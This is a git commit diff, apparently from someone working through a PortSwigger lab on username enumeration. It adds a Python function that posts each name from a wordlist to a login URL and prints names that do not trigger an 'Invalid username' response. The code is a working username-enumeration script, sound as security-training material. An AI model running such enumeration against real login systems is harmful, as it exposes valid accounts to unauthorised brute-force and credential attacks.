31699836dfd617aaaf11e29b86984786006c74c4
Michael George <michael.g.george@gmail.com>
2022-11-02 04:14:00 +0530

    Complete user_enum in username_diff_res, script, auth

--- portswigger/auth/username_diff_res/script.py
+++ portswigger/auth/username_diff_res/script.py
@@ -1,12 +1,18 @@
 from requests import post
+from pathlib import Path
 
 url = ''
 headers = {}
 cookies = {}
 data = {}
 
-def user_enum():
-    pass
+def user_enum(url, user_file_list, headers, cookies):
+    with Path(user_file_list).open('r') as file:
+        lines = file.readlines()
+        for line in lines:
+            res = post(url=url, data={'username': line, 'password': 'asdf'})
+            if 'Invalid username' not in res.text:
+                print(line)
 
 def pass_enum():
     pass
